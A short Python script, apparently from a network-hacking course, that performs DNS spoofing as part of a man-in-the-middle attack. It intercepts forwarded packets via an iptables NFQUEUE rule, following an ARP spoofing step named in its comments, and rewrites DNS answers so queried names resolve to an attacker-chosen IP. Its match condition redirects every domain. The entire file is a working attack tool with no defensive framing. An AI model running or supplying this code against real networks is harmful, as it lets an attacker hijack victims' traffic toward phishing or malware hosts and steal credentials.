# pip install netfilterqueue
# run arp_spoof.py
# run in terminal: iptables -I FORWARD -j NFQUEUE --queue-num 0
import netfilterqueue
import scapy.all as scapy

new_ip = "10.0.2.16"
# IP of a wbsite

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "" in qname: # e.g. www.bing.com
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=new_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

